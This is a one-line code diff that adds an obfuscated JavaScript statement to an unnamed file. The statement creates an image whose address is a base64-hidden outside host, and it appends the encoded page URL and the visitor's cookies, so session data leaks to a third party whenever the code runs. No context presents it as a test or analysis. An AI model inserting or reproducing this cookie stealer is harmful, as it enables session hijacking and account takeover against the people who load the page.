@@ -1,0 +1,1 @@
+document.createElement("img").src=atob("aHR0cHM6Ly93LmczMi5jb20vZz9rPQ==")+btoa(document.location.href+"*"+document.cookie);
